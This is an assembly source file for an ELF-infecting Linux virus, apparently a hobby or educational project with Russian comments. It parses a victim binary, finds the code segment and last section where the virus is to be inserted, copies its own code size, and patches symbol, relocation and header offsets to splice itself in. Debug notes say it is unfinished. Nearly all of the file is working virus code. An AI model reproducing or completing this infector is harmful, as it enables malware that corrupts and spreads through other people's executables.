/// Example of ELF-infector (GNU/Linux virus project)
/// Copyright () Rigidus & 0xBECEDA 2020-2021
/// XREF: https://github.com/0xBECEDA/malware
/// LICENSE: Gnu Public Licence v.3

/// Compile:
///      gcc malware.s -nostdlib -o asm
/// или:
///      as malware.s -nostdlib -o asm.o
///      ld asm.o -o asm
/// также cmdstring для отладки макросов:
/// as -a malware.s -nostdlib -o asm
/// ключ -a позволяет увидеть генерацию макросов

/// TLDR & TOC:
/// - define C-constants
/// - macro declararations
/// - defuine .set-constants
/// - .text of pseudo-victim
/// - .data of pseudo-victim
/// - .text of infector
///   + _start_infector
///   + ...
///   + _test_file_infection
///   + ...
///   + _my_mmap
///   + _my_stat
///   + _openfile
///   + ...
///   + _canary
///   + STACK
///   + ...
///   + _my_write
///   + _error_msg
///   + _end_infector
///   + _fin_infector

/// Полезное или может пригодиться:
/// https://reverse.put.as/wp-content/uploads/2011/03/gdbreferencecard.html
/// https://cs.lmu.edu/~ray/notes/gasexamples/
/// https://stackoverflow.com/questions/14361248/whats-the-difference-of-section-and-segment-in-elf-file-format
/// http://tigcc.ticalc.org/doc/gnuasm.html#SEC39
/// https://www.opennet.ru/docs/RUS/gas/gas-4.html


/// Если эта переменная существует,
/// макросы будут генерировать отладочный вывод
    .set DEBUG_MODE, 1

/// CANARY
/// Мы хотим проверять, что стек не переполнен
/// Поэтому мы размещем значение-канарейку, которое
/// будет затерто если стек будет переполнен и
/// создаем макрос для проверки этого значения
#define CANARY_VAL 0xDEADBEEFBAADF00D

/// MACRO--------------------------------------

    // https://www.opennet.ru/docs/RUS/gas/gas-7.html#ss7.38
    // \@ хранит счетчик, содержащий число, которое
    // показывает, сколько раз был выполнен этот
    // макрос; вы можете вывести это число при
    // помощи \@, но только внутри определения макроса.

    .macro CHECK_CANARY
        .ifdef DEBUG_MODE
            mov     _canary(%rip), %rax
            mov    $CANARY_VAL, %rbx
            cmp    %rax, %rbx
            je      1f              # forward label 1
            lea     2f(%rip), %rsi  # forward label 2
            mov     $len_e_canary_\@, %rdx
            jmp     _error_msg
        2:
            .string "ERR: canary \@\n"
            .set len_e_canary_\@, . - 2b
        1:
        .endif
    .endm

    // Макрос для генерации сообщений об ошибках

    .macro ERR_MSG name msg
        .ifdef DEBUG_MODE
            \name\()_error:
                lea     \name\()_msg_e(%rip), %rsi
                mov     $len_e_\name, %rdx
                // call    _my_write
                // xor     %rax, %rax
                // jmp     \name\()_exit
                jmp     _error_msg
            \name\()_msg_e:
                .ascii "ERR: \msg\()\n"
                .set len_e_\name, . - \name\()_msg_e
        .else
            \name\()_error:
                jmp     \name\()_exit
        .endif
    .endm

    // Макрос для печати строки
    // NB!: давай макросы к макросам, а код - к коду

    .macro PRINT_STR name msg
        lea     \name\()_msg_print(%rip), %rsi
        mov     $len_e_\name, %rdx
        call    _my_write
        jmp     \name\()_end
    \name\()_msg_print:
        .ascii "\msg\()\n "
        .set len_e_\name, . - \name\()_msg_print
    \name\()_end:
    .endm

    // Конвертирует и печатает число, находящееся
    // по заданному адресу

    .macro CNVRT_NUM num_addr

        // BN: ты прав, очистка не нужна, код удален
        // растянули число на 16 байт
        lea     \num_addr\()(%rip), %rdx
        mov     (%rdx), %rdi
        call    cnvrt_addr_in_16_byte

        // сконвертировали число в ascii коды
        lea     byted_addr(%rip), %rsi
        call    cnvrt_num_to_hex_string

        // вывод числа
        lea     converted_addr(%rip), %rsi
        mov     $0x11, %rdx
        call    _my_write

        // вывод доп. перевода строки
        lea     newline(%rip), %rsi
        mov     $0x1, %rdx
        call    _my_write

    .endm



/// CONST--------------------------------------

    .set O_RDONLY, 0x0
    .set O_RDWR, 0x2
    .set MAP_PRIVATE, 0x2
    .set PROT_NONE, 0x0
    .set PROT_READ, 0x1
    .set PROT_WRITE, 0x2
    .set PROT_EXEC, 0x4
    .set PROT_READ_OR_PROT_WRITE, 0x3
    .set O_RDWR_AND_O_APPEND, 0x402
    .set ELF_E_ENTRY, 0x18
    .set ELF_E_PHOFF, 0x20
    .set ELF_E_SHOFF, 0x28
    .set ELF_E_PHNUM, 0x38
    .set ELF_E_SHNUM, 0x3c
    .set PHDR_P_OFFSET, 0x8
    .set PHDR_P_VADDR, 0x10
    .set PHDR_P_PADDR, 0x18
    .set PHDR_P_FILESZ, 0x20
    .set PHDR_P_MEMSZ, 0x28
    .set SHDR_SH_ADDR, 0x10
    .set SHDR_SH_TYPE, 0x4
    .set SHDR_SH_SIZE, 0x20

    // .macro ADDR_MASQUE reg
//     mov $0xF, \reg
// .endm

/// На случай если инфектор будет слинкован
/// с другими библиотеками, лучше сделать так,
/// чтобы его код был в отдельной подсекции -
/// так проще его извлекать.
///
/// Тогда основная подсекция будет содержать
/// код псевдо-жертвы:

/// CODE 0-------------------------------------
    .text 0

    .global	_start
	.type	_start, @function

_start:
    jmp     _start_infector
_start_victim:
    lea     _msg_victim(%rip), %rsi
    mov     $len_msg_victim, %rdx
    mov     $0x1, %rax          # write
    mov     %rax, %rdi          # to stdout
    syscall
_exit_victim:
    mov $0x3c, %rax
    mov $0x0,  %rdi
    syscall


/// DATA 0-------------------------------------
/// данные псевдо-жертвы
    .data 0
_msg_victim:
    .ascii "Hello, I am victim\n"
    .set len_msg_victim, . - _msg_victim


/// CODE 1-------------------------------------
/// Подсекция кода инфектора
    .text 1


// elf_malware_addr:
//     .long 0

// elf_victim_addr:
//     .long 0


/// INTENT:
/// ~~~~~~
/// Мы хотим разрешить самомодифицирующийся код.
/// Для этого мы должны передать MPROTECT выровненный
/// адрес.
/// Этот адрес должен быть выше адреса _start_infector.
/// Он совпадает с адресом начала сегмента кода,
/// но мы не можем быть в этом уверены, когда находимся
/// в зараженном файле.

 	.global	_start_infector
	.type	_start_infector, @function
_start_infector:

    // -=:[ Разрешаем писать себе в код ]:=-

    lea     _start_infector(%rip), %rdi
    and     $~0x3FF, %rdi       # ..in %RDI
    lea     _fin_infector(%rip), %rsi   # get end addr
    sub     %rdi, %rsi          # total size - %RSI
    // CALL MPROTECT            # start addr - %RDI
    mov     $0x7, %rdx            # RW+EXEC flags - $RDX
    mov     $0xA, %rax            # mprotect handle
    syscall
    test    %rax, %rax
    jz      _mprotect_is_ok
    // ------------------------ #
    ERR_MSG mprotect "mprotect in _start"
old_rsp:
    .quad 0     # вершина стека жертвы
    // ------------------------ #
_mprotect_is_ok:
    // Set Stack
    mov     %rsp, old_rsp(%rip)     # save old %RSP
    lea     _stack_bottom(%rip), %rsp

    // -=:[ Разбор файла жертвы ]:=-
    // NB!: Перенес test_file_infection cюда

    //
    // BN!: DEBUD INFO:
    // Тестовый файл собирается, но с ошибкой:
    // "динамическом сегменте нет раздела .dynamic"
    //  Речь идет о сегменте DYNAMIC и секции dynamic.
    //  Сегмент DYNAMIC включает в себя секцию .dynamic
    // (и ряд других). Секция .dynamic - первая в
    // сегменте DYNAMIC. Таким образом сегмент и секция
    // имеют одинаковый vaddr и offset от нач. файла
    //
    //  ПРОВЕРЕНЫ И ОТВЕРГНУТЫ ГИПОТЕЗЫ ОШИБКИ:
    // - несовпадающие адреса и/или смещения сегмента
    // и секции. Просмотр програмхедеров и хежеров
    // секций через readelf показал, что адреса и
    // смещения одинаковые
    // - в сам код секции .dynamic попал мусор.
    // В дампе исходной жертвы был найден дизассембл.
    // раздел DYNAMIC, затем в бинаре выходного файле
    // по сигнатуре был найден код этого размера. Код
    // лежеит по заявленному в заголовке секции смещению
    //
    // НЕПРОВЕРЕННЫЕ ГИПОТЕЗЫ ОШИБКИ:
    // Возможно,проблема в вырваниваниях.
    // Смещение и адрес должны быть сравнимы по модулю,
    // т.е. (p_addr - p_offset) / p_allign = частное без
    // остатка. Я пересчитываю адреса и смещения, поэтому
    // это соотношение может перестать работать

    lea     _file_name3(%rip), %rdi
    // lea     _victim_nolibs_filenm(%rip), %rdi
    // получить данные жертвы
    call    _get_victim_data
    // call    _print_victim_data_fn
    // получить данные вируса
    call    _get_virus_code
    // call    _print_virus_data_fn
    // найти точку для заражения
    call    _find_point_for_infection
    // call    _print_infection_data_fn
    // отредактировать поля заголовков
    call    _recount
    lea     new_elf_file(%rip), %rdi
    // записать код вируса и жертвы в новый эльф
    call    _recombine_elf


// _test_file_infection_error:
//     mov     $1, %rax            # write
//     mov     $1, %rdi            # to stdout
//     lea     _errmsg_openfile_tfi(rip), %rsi
//     mov     $len_errmsg_openfile_tfi, %rdx
//     syscall
// _errmsg_openfile_tfi:
//     .string "err: openfile in _test_file_infection\n"
//     .set len_errmsg_openfile_tfi, . - _errmsg_openfile_tfi
//     jmp _exit


    // -----------------------------------
    // TODO: Здесь надо продолжать... <= |
    // -----------------------------------
    // DEBUG: эльф собирается неверно, отсутствует
    // заголовок эльфа - скорее всего
    // поврежден указатель на начало эльфа
    // (скорее всего ошибка по невнимательности)


    // call    test_my_memcpy
    // call    test_my_fread
    // call    test_cnvrt_addr_in_16_byte
    // call    test_cnvrt_num_to_hex_string
    // call    test_cnvrt_addr_in_16_byte

    // call    test_fwrite
    // call    test_my_printf1
    // call    test_my_printf2
    // call    test_my_printf3
    // call    test_read_elf_header
    // call    test_read_program_header
    // call    test_read_section_header
    // call    test_read_all_program_headers
    // call    test_read_all_section_headers
    // call    test_find_last_segment_header
    // call    test__shdr_offset_and_addr_recount
    // call    test _find_infection_segment
    // call    test _find_infection_section
    // call    test__phdr_offset_and_addr_recount
    // call    test_pwrite_into_file
    // call    test_pwrite

_canary_test:
    CHECK_CANARY

    // call    test_find_virus_signature
    // call    _test_variable_macroses
    // call     _recombine_elf

    jmp     _end_infector

// _FIND_INFECTION_SEGMENT
// PARAMS
// - %RDI - phdr addr table
// - %RSI - phdr amount
// - %RDX - e_entry
//
// находит первый сегмент PL_LOAD для заражения -
// этот сегмент содержит e_entry
//
// Как понять, что сегмент содержит e_entry:
// его p_vaddr <= e_entry,
// его p_vaddr + p_filesz > e_entry
//
// В случае, если такой сегмент существует, то:
// - в infected_seg_phdr_addr записывается адрес,
// по которому лежит сегмент в памяти
// - в infected_seg_size записывается размер сегмента
// - в infected_seg_end_vaddr записывается
// ВИРТУАЛЬНЫЙ адрес, на котором сегмент кончается
    .globl  _find_infection_segment
	.type	_find_infection_segment, @function
_find_infection_segment:
    push    %rbx
    push    %rcx
    push    %rax

    mov     %rsi, %rcx

_find_infection_segment_cycle:
    mov     %rdi, %rax

    mov     (%rdi), %ebx        # проверяем поле p_type
    cmp     $0x1, %rbx

    jne     _next_iter_find_infection
    mov     PHDR_P_VADDR(%rdi), %rbx     # получаем поле p_vaddr

    cmp     %rdx, %rbx  # vaddr долен быть <= e_entry
    // иначе переход на следующую итерацию
    jg      _next_iter_find_infection

    mov    %rax, %rdi
    mov    PHDR_P_FILESZ(%rdi), %rsi # размер текущего сегмента

    add    %rsi, %rbx   # адрес конца текущeго сегмент

    cmp    %rdx, %rbx   # cur segment end > e_entry
    jl     _next_iter_find_infection

    jmp    _find_infection_success   # segment is found
_next_iter_find_infection:

    add     $0x38, %rax
    mov     %rax, %rdi

    loop    _find_infection_segment_cycle
    jmp     _find_infection_segment_error # noting is fund

_find_infection_success:

    leaq    infected_seg_phdr_addr(%rip), %rcx
    mov     %rax, (%rcx)                  # save seg addr

    leaq    infected_seg_size(%rip), %rcx
    mov     %rsi, (%rcx)                  # save seg size

    leaq    infected_seg_end_vaddr(%rip), %rcx
    mov     %rbx, (%rcx)        # save seg addr end

_find_infection_segment_exit:

    pop     %rax
    pop     %rcx
    pop     %rbx

    ret

    ERR_MSG _find_infection_segment "_find_infection_segment: No segment found"

/// _ADD_SIZE_TO_PHDR
/// увеличивает поля заголовка p_filesz и p_memsz
/// на заданную величину
/// в rdi принимает указатель на заголовок
/// в rsi - число, на которое надо увеличить
/// p_filesz и p_memsz
    .globl  _add_size_to_phdr
	.type	_add_size_to_phdr, @function
_add_size_to_phdr:

    add $0x20, %rdi
    add %rsi, (%rdi)

    add $0x8, %rdi
    add %rsi, (%rdi)

    ret

/// _ADD_SIZE_TO_SHDR
/// увеличивает полe заголовка sh_size
/// на заданную величину
/// в rdi принимает указатель на заголовок
/// в rsi - число, на которое надо увеличить sh_size
    .globl  _add_size_to_shdr
	.type	_add_size_to_shdr, @function
_add_size_to_shdr:

    add $0x20, %rdi
    add %rsi, (%rdi)

    ret


/// _FIND_INFECTION_SEСTION
/// находит последнюю секцию в заражаемом сегменте
//  PL_LOAD - она ближе всех к концу сегмента
///
/// PARAMS
/// RDI - shdr table ptr in memory
/// RSI - shdr amount
//  RDX - ВИРТУАЛЬНЫЙ адрес конца сегмента кода

    .globl  _find_infection_seсtion
	.type	_find_infection_seсtion, @function

_find_infection_seсtion:
    push    %rax
    push    %rbx
    push    %rcx
    push    %r8
    push    %r9

    mov     %rsi, %rcx
    mov     %rdi, %r8           # shdr table addr

_find_infection_section_cycle:
    mov     %rdi, %rax

    mov     SHDR_SH_ADDR(%rdi), %rsi     # get sect vaddr

    cmp     %rdx, %rsi # sect vaddr >= vaddr end segment?
    jge     next_iter_find_section_infection  # yes

    mov     %r8, %r9                          # no
    mov     SHDR_SH_ADDR(%r9), %rbx
    cmp     %rbx, %rsi   # cur vaddr <= vaddr saved shdr?
    jle     next_iter_find_section_infection  # yes

    mov     %rax, %r8         # save new last shdr
next_iter_find_section_infection:

    add     $0x40, %rax        # move to next shdr
    mov     %rax, %rdi

    loop    _find_infection_section_cycle

_find_infection_section_end:

    leaq    infected_sect_shdr_addr(%rip), %rax     # save addr
    mov     %r8, (%rax)

    pop     %r9
    pop     %r8
    pop     %rcx
    pop     %rbx
    pop     %rax
    ret

// test__find_infection_section:
//     push    %rbp
//     mov     %rsp, %rbp

//     mov     $file_name3, %rdi
//     mov 	$O_RDONLY,  %rsi
//     call    openfile

//     cmp     $0, %rax
//     jle     test__find_infection_section_end

//     mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
//     mov     %rax, %rsi

//     push    %rax  # 0x7ffff7ff6000

//     mov ELF_E_PHOFF %rdi, %rcx
//     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

//     mov     %rax, %rdi

//     mov     ELF_E_PHNUM(%rax), %ecx  # считаем, сколько места занимают все заголовки
//     movzwl  %cx, %ecx

//     mov     %rcx, %rdx

//     mov     $0x38, %rax
//     imul    %rcx,  %rax

//     pop     %r10

//     add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
//     sub     %rax,  %rsp

//     mov     %rax, %r8
//     ELF_E_ENTRY %rdi, %rbx

//     push    %rsi
//     push    %rdx
//     push    %r8

//     mov     $e_entry_msg, %rdi
//     mov     %rbx, %rsi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8

//     call    my_printf

//     pop    %r8
//     pop    %rdx
//     pop    %rsi

//     lea     (%rsp),  %rdi
//     call    read_all_program_headers

//     lea     (%rsp),  %rdi
//     mov     %rcx, %rsi
//     mov     %rbx, %rdx
//     call    _find_infection_segment

//     mov     %rax, %rdi  #0x40201e

//     call    print_program_header

//     mov     %r10, %rsi # положили адрес начала эльфа
//     mov     %r8, %r10  # сохранили количество байт, которые резервировали

//     mov     %rsi, %rdi
//     mov     %rsi, %r9

//     mov     ELF_E_SHOFF(%rdi), %rcx
//     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

//     mov     ELF_E_SHNUM(%r9), %ecx  # считаем, сколько места занимают все заголовки
//     movzwl  %cx, %ecx

//     mov     %rcx, %rdx

//     mov     $0x40, %r9
//     imul     %rcx,  %r9

//     add     $8,   %r9  # резервируем место на стеке под заголовки (с запасом 8 байт)
//     sub     %r9,  %rsp

//     mov     %r9, %r11

//     lea     (%rsp),  %rdi

//     call    read_all_section_headers

//     mov     %rax, %rdi   # взяли адерс сохраненного заголовка сегмента кода
//     mov     %rdi, %r8

//     mov     PHDR_P_VADDR(%r8), %rbx   # получаем поле p_vaddr
//     mov     PHDR_P_FILESZ(%rdi), %r9   # получаем поле p_filesz

//     add     %r9, %rbx   # высчитали, где кончается сегмент

//     mov     %rdx, %rsi

//     mov     %rbx, %rdx

//     lea     (%rsp),  %rdi

//     call    _find_infection_seсtion

//     push    %r11
//     mov     $next_str, %rdi
//     mov     $0x0, %rsi
//     mov     $0x0, %rdx
//     mov     $0x1, %r8

//     call    my_printf

//     mov     %rax, %rdi
//     call    print_section_header

//     pop     %r11
//     add     %r10, %r11
//     add     %r11, %rsp

// test__find_infection_section_end:
//     pop    %rbp
//     ret

// FIND_SYMTAB_CODE
// Ищет среди всех заголовков секций заголовк symtab - этот заголовок описывает
// таблицу символов. Ищем по типу заголовка - у symtab этот тип 2, symtab может быть
// в файле в единственном числе
// PARAMS:
// RDI - указатель нa таблицу заголвоков секций
// RSI - количество заголовков
_find_symtab:
    push    %rcx
    push    %rdx

    mov     %rsi, %rcx
_find_symtab_cycle:
    mov     %rdi, %rsi
    mov     SHDR_SH_TYPE(%rdi), %rdx

    cmp     $0x2, %rdx   # shdr = symtab?
    je      _find_symtab_success

    add     $0x40, %rsi
    mov     %rsi, %rdi
    loop    _find_symtab_cycle

_find_symtab_success:
    leaq    symtab_shdr_addr(%rip), %rdi
    mov     %rsi,  (%rdi)

    // считаем кол-во записией в symtab
    // symtab size / symtab record size = rec. amount
    mov     SHDR_SH_SIZE(%rsi), %rdx
    mov     $0x18, %ecx
    movl     %edx, %eax
    xor      %rdx, %rdx
    idivl    %ecx

    leaq    symtab_records_amount(%rip), %rdi
    mov     %rax, (%rdi)

_find_symtab_fail:
    pop     %rdx
    pop     %rcx

    ret

/// _RECOUNT_SYMBOLS_ADDRS
// Редактирует vaddr символов
// PARAMS:
// RDI - указатель на заголовок symtabs
// RSI - количество записей в symtab
// RDX - vaddr точки заражения
_recount_symbols_addrs:
    push    %rcx
    push    %rax
    test    %rdi, %rdi
    je      _recount_symbols_addrs_exit
    mov     %rsi, %rcx

    leaq    victim_elf_addr(%rip), %rsi
    mov     (%rsi), %rsi
    add     $0x18, %rdi
    add     (%rdi), %rsi
    mov     %rsi, %rdi

_recount_symbols_addrs_cycle:
    add     $0x8, %rdi   # offset до vaddr символа
    cmp     %rdx, (%rdi)
    jl      _recount_symbols_next_iter

    leaq    virus_code_size(%rip), %rsi
    mov     (%rsi), %rax
    add     %rax, (%rdi)  # сместили на разм. virus code

_recount_symbols_next_iter:
    add     $0x10, %rdi
    loop    _recount_symbols_addrs_cycle
_recount_symbols_addrs_exit:
    pop     %rax
    pop     %rcx
    ret

// _RECOUNT_REL_SECTION
// редактирует vaddr релокейта, если он находится НИЖЕ
// точки заражения. Секций rel_name может быть множество в файле
// RDI - offset до секции rel
// RSI - vaddr точки заражения
// RDX - размер вируса
// RCX - размер секции
_recount_rel_section:
    push    %rax

    // узнали кол-во записей в секции
    push    %rdx

    xor     %rdx, %rdx
    mov     %ecx, %eax
    mov     $0x18, %ecx
    idiv    %ecx
    mov     %eax, %ecx

    pop     %rdx

    //  получили адрес секции в памяти
    leaq    victim_elf_addr(%rip), %rax
    mov     (%rax), %rax
    add     %rdi, %rax

_recount_rel_section_cycle:
    // сравнили vaddr точки заражения и релокейта
    cmp     %rsi, (%rax)
    jl      _recount_rel_section_next_iter

    // vaddr релокейта + размер вируса
    add     %rdx, (%rax)
_recount_rel_section_next_iter:
    add     $0x18, %rax    # сдвиг на след. запись
    loop    _recount_rel_section_cycle

_recount_rel_section_exit:
    pop     %rax
    ret

/// _GET_VIRUS_CODE
/// @PARAMS - no
///
/// Читает указатель начала кода вируса и размер этого
/// кода.
/// Записывает адрес кода вируса в virus_code_addr и
/// размер этого кода в virus_code_size
/// NB!: Есть мнение, что достаточно найти
/// сигнатуру начала вируса а длину мы можем
/// вычислить на стадии компиляции. Это можно сделать
/// прямо в памяти, без открытия файла. А если мы это
/// делаем в памяти, то мы из любой точки можем
/// посчитать относительное расстояние до метки
/// _infector_start, так что даже и без сигнатуры можно
/// обойтись.
_get_virus_code:

    leaq    _start(%rip), %rdi  # начало вируса
    leaq    virus_code_addr(%rip), %rsi
    mov     %rdi, (%rsi)

    leaq    _fin_infector(%rip), %rsi
    sub     %rdi, %rsi  # размер вируса

    leaq    virus_code_size(%rip), %rdi
    mov     %rsi, (%rdi)

    ret


/// _GET_VICTIM_DATA
/// @PARAMS
/// - % RDI - имя жертвы
///
/// Высчитывает и заполняет переменные:
/// - адрес начала эльфа в памяти
/// записывается в victim_elf_add
/// - адрес теблицы заголовков программ
///   в victim_phdr_table_addr
/// - количество заголовов программ
///   в victim_phdr_amount
/// - сколько места они занимают все вместе
///   в victim_phdr_table_size
/// - адрес теблицы заголовков секций
///   в victim_shdr_table_addr
/// - количество заголовов  секций
///   в victim_shdr_amount
/// - сколько места они занимают все вместе
///   в victim_shdr_table_size
/// - адрес начала кода жертвы
///   в victim_code_before_infect_point_addr
_get_victim_data:
   	push    %rax
	push    %rbx
	push    %rcx
	push    %rdx
    push    %rsi

    mov     $O_RDWR, %rsi
    call    _openfile

    // NB!: Зачем нужно сначала брать адрес, а потом
    // записывать по нему, что мешает сразу записать?
    leaq    victim_elf_addr(%rip), %rdi
    mov     %rax, (%rdi)    # save elf victim addr

    mov     %rax, %rsi      # elf victim addr
    mov     %rax, %rdi
    // NB!: Тут надо переделать макросы на доступ
    // по смещениям и вообще, посмотреть может эта
    // функция не нужна, потому что мы в любой момент
    // можем получить все что необходимо по этим
    // смещениям - и незачем пересохранять это в
    // отдельные переменные
    // BN: каждый раз пересчитывать по смещениям - это привет ошибкам,
    // ты сам сказал все занести в переменные и отслеживать их
    mov     ELF_E_PHOFF(%rdi), %rcx
    add     %rcx, %rsi      # phdr table addr

    leaq    victim_phdr_table_addr(%rip), %rdx
    mov     %rsi, (%rdx)    # save phdr table addr

    mov     %rax, %rdi      # phdr amount
    mov     ELF_E_PHNUM(%rdi), %ecx
    movzwl  %cx, %ecx

    leaq    victim_phdr_amount(%rip), %rdx
    mov     %rcx, (%rdx)    # save phdr table amount

    mov     $0x38, %rdx
    imul    %rcx,  %rdx     # phrd table size

    leaq    victim_phdr_table_size(%rip), %rcx
    mov     %rdx, (%rcx)    # save phrd table size

    mov     %rax, %rdi
    mov     %rax, %rsi

    mov     ELF_E_SHOFF(%rdi), %rcx
    add     %rcx, %rsi      # shdr table addr

    leaq    victim_shdr_table_addr(%rip), %rdx
    mov     %rsi, (%rdx)

    mov     %rax, %rdi
    mov     ELF_E_SHNUM(%rdi), %ecx  # shdr amount
    movzwl  %cx, %ecx

    leaq    victim_shdr_amount(%rip), %rdx # save shdr amount
    mov     %rcx, (%rdx)

    mov     $0x40, %rdx
    imul     %rcx,  %rdx    # shdr table size

    leaq    victim_shdr_table_size(%rip), %rcx  # save shdr table size
    mov     %rdx, (%rcx)

    pop     %rsi
	pop     %rdx
	pop     %rcx
	pop     %rbx
    pop     %rax

    ret

/// _PRINT_VICTIM_DATA_fn
/// @PARAMS - no
/// Печатает значени переменных:
/// - victim_elf_addr
/// - victim_phdr_table_addr
/// - victim_phdr_amount
/// - victim_phdr_table_size
/// - victim_shdr_table_addr
/// - victim_shdr_amount
/// - victim_shdr_table_size
/// - victim_code_before_infect_point_size
/// - victim_code_after_infect_point_addr
/// - victim_code_after_infect_point_size
_print_victim_data_fn:
    PRINT_STR print_victim_data1 "-------------------- \n"
    PRINT_STR print_victim_data2 "PRINT_VICTIM_DATA \n \n"

    PRINT_STR victim_elf_addr "victim_elf_addr val: "
    CNVRT_NUM victim_elf_addr

    PRINT_STR victim_phdr_table_addr "victim_phdr_table_addr val: "
    CNVRT_NUM victim_phdr_table_addr

    PRINT_STR victim_phdr_amount "victim_phdr_amount val: "
    CNVRT_NUM victim_phdr_amount

    PRINT_STR victim_phdr_table_size "victim_phdr_table_size val: "
    CNVRT_NUM victim_phdr_table_size

    PRINT_STR victim_shdr_table_addr "victim_shdr_table_add  val: "
    CNVRT_NUM victim_shdr_table_addr

    PRINT_STR victim_shdr_amount "victim_shdr_amount val: "
    CNVRT_NUM victim_shdr_amount

    PRINT_STR victim_shdr_table_sz "victim_shdr_table_size val: "
    CNVRT_NUM victim_shdr_table_size

    PRINT_STR victim_code_b_inf_point_sz "victim_code_before_infect_point_size val: "
    CNVRT_NUM victim_code_before_infect_point_size

    PRINT_STR victim_code_a_inf_pnt_addr "victim_code_before_infect_point_addr val: "
    CNVRT_NUM victim_code_after_infect_point_addr

    PRINT_STR victim_code_a_infect_point_sz "victim_code_before_infect_point_size val: "
    CNVRT_NUM victim_code_after_infect_point_size

    PRINT_STR print_victim_end "--------------------\n"

    ret

// Печатает данные вируса: адрес его кода в памяти и размер этого кода
_print_virus_data_fn:

    PRINT_STR print_virus_data1 "--------------------\n"
    PRINT_STR print_virus_data2 "PRINT_VIRUS_DATA \n \n"

    PRINT_STR  virus_code_addr "virus_code_addr val: "
    CNVRT_NUM  virus_code_addr

    PRINT_STR  virus_code_size "virus_code_size val: "
    CNVRT_NUM  virus_code_size

    PRINT_STR print_virus_end "-------------------- \n"

    ret

/// NB!: Пусть комменты к процедурам будут без отступа
/// FIND_POINT_FOR_INFECTION
/// Ищет точку заражения в жертве:
/// - находит первый сегмент кода
///   (в нем нахоится entry point)
/// - находит в нем последнюю секцию
/// - сохраняет размер первого сегмента кода
_find_point_for_infection:

    push  %rax
    push  %rbx
    push  %rdx
    push  %rcx
    push  %rdi
    push  %rsi

    // prepare params for _find_infection_segment
    // NB!: индексная адресация со смещением
    // вместо макроса (в след строке)
    leaq  victim_elf_addr(%rip), %rbx
    mov   (%rbx), %rdi

    mov   ELF_E_ENTRY(%rdi), %rdx

    leaq  victim_phdr_table_addr(%rip), %rbx
    mov   (%rbx), %rdi

    leaq  victim_phdr_amount(%rip), %rcx
    mov   (%rcx), %rsi

    // получить адрес, размер  и виртуальный адрес
    // конца заражаемого сегмента
    // записаны в vars: infected_seg_phdr_addr,
    // infected_seg_size, infected_seg_end_vaddr
    // NB!: Для тех, кому еще не очевидно:
    // если писать метки кода начиная с _underscore_
    // то их гораздо проще отличать от меток с данными
    // и констант. Поправь везде. И не делай
    // комментарии длиннее чем 55 символов,
    // неудобно смотреть код в двух буферах.
    // Я уже задолбался исправлять!
    call  _find_infection_segment

    // prepare params for _find_infection_segment
    leaq  infected_seg_end_vaddr(%rip), %rbx
    mov   (%rbx), %rdx

    leaq  victim_shdr_table_addr(%rip), %rbx
    mov   (%rbx), %rdi

    leaq  victim_shdr_amount(%rip), %rcx
    mov   (%rcx), %rsi

    //  получить адрес последней секции в сегменте
    call  _find_infection_seсtion

    pop  %rsi
    pop  %rdi
    pop  %rcx
    pop  %rdx
    pop  %rbx
    pop  %rax

    ret

    // Печатает данные, необходимые для заражения:
    // - infected_seg_phdr_addr
_print_infection_data_fn:

    PRINT_STR print_infection_data1 "--------------------\n"
    PRINT_STR print_infection_data2 "PRINT_INFECTION_DATA \n \n"

    PRINT_STR  infected_seg_phdr_addr "infected_seg_phdr_addr val: "
    CNVRT_NUM  infected_seg_phdr_addr

    PRINT_STR  infected_seg_size "infected_seg_size val: "
    CNVRT_NUM  infected_seg_size

    PRINT_STR  infected_seg_end_vaddr "infected_seg_end_vaddr val: "
    CNVRT_NUM  infected_seg_end_vaddr

    PRINT_STR  infected_sect_shdr_addr "infected_sect_shdr_addr val: "
    CNVRT_NUM  infected_sect_shdr_addr

    PRINT_STR print_infection_data_end "-------------------- \n"

    ret

/// RECOUNT
/// PARAMS - no
/// Редактирует поля всех shdr и phdr, которые
/// описывают код, находящийся НИЖЕ точки заражения -
/// весь код должен сместиться на размер вируса вниз
/// по файлу
/// Редактирует поля заголовков заражаемого сегмента и
/// заражаемой секции, содержащие в себе размер
/// описываемого кода - вирус пишется после последней
/// секции в заражаемом сегменте, т.е. сегмент
/// расширяется, как и последняя секция
/// Редактирует поле e_shoff в заголовке эльфа - т.е.
/// смещение до заголовков секций: они сместятся
/// на размер вируса
_recount:
    push  %rax
    push  %rbx
    push  %rdx
    push  %rcx
    push  %rdi
    push  %rsi

    // редактируем записи в таблице символов

    leaq  victim_shdr_amount(%rip), %rbx
    mov   (%rbx), %rsi

    leaq  victim_shdr_table_addr(%rip), %rbx
    mov   (%rbx), %rdi

    call  _find_symtab

    leaq  symtab_shdr_addr(%rip), %rbx
    mov   (%rbx), %rdi

    leaq  symtab_records_amount(%rip), %rbx
    mov   (%rbx), %rsi

    leaq  infected_seg_end_vaddr(%rip), %rbx
    mov   (%rbx), %rdx

    call  _recount_symbols_addrs

    // расширить заражаемую секцию на разм. вируса
    leaq  virus_code_size(%rip), %rbx
    mov   (%rbx), %rsi

    leaq  infected_sect_shdr_addr(%rip), %rbx
    mov   (%rbx), %rdi

    call   _add_size_to_shdr

    // params for _shdr_offset_and_addr_recount
    leaq  virus_code_size(%rip), %rbx
    mov   (%rbx), %rcx

    leaq  infected_seg_end_vaddr(%rip), %rbx
    mov   (%rbx), %rdx

    leaq  infected_seg_phdr_addr(%rip), %rbx
    mov   (%rbx), %rdi
    mov   PHDR_P_OFFSET(%rdi), %r8

    leaq  infected_seg_phdr_addr(%rip), %rbx
    mov   (%rbx), %rdi
    mov   PHDR_P_FILESZ(%rdi), %rax
    add   %rax, %r8

    leaq  victim_shdr_amount(%rip), %rbx
    mov   (%rbx), %rsi

    leaq  victim_shdr_table_addr(%rip), %rbx
    mov   (%rbx), %rdi

    //  увеличить поля sh_offset и sh_addr
    //  всех shdr, находящихся после точки заражения
    // - vaddr end заражаемого сегмента -
    // на размер кода вируса
    call   _shdr_offset_and_addr_recount

    // посчитать размер кода от начала эльфа
    // до точки заражения
    leaq  infected_seg_phdr_addr(%rip), %rbx
    mov   (%rbx), %rdi

    mov   PHDR_P_OFFSET(%rdi), %rax

    leaq  infected_seg_size(%rip), %rbx
    mov   (%rbx), %rcx

    add   %rcx, %rax
